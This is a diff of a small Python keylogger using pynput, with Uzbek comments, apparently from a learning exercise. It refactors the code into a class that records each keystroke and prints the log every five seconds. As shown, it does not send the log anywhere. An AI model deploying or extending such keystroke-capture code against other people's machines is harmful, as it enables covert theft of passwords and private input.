@@ -2,23 +2,29 @@
 import pynput.keyboard
 import threading
 
-log = ""
-
 class Keylogger:
+    def __init__(self):
+        self.log = ""
+    
+    def append_to_log(self, string):
+        self.log += string  # Logga yangi qator qo'shish
+
     def process_key_press(self, key):
-        global log
+        current_key = ""  # Har bir tugma bosilganda yangi o'zgaruvchi
+
         try:
-            log += str(key.char)  # Agar tugma harf bo'lsa
+            current_key += str(key.char)  # Agar tugma harf bo'lsa
         except AttributeError:
-            if key == key.space:
-                log += " "  # Bo'sh joy tugmasi uchun
+            if key == pynput.keyboard.Key.space:
+                current_key += " "  # Bo'sh joy tugmasi uchun
             else:
-                log += f" [{key}] "  # Maxsus tugmalar uchun
+                current_key += f" [{key}] "  # Maxsus tugmalar uchun
+        
+        self.append_to_log(current_key)
 
     def report(self):
-        global log
-        print(log)  # Logni chop etish
-        log = ""  # Logni tozalash
+        print(self.log)  # Logni chop etish
+        self.log = ""  # Logni tozalash
         timer = threading.Timer(5, self.report)  # 5 soniyadan keyin qayta chaqirish
         timer.start()  # Timerni boshlash
 
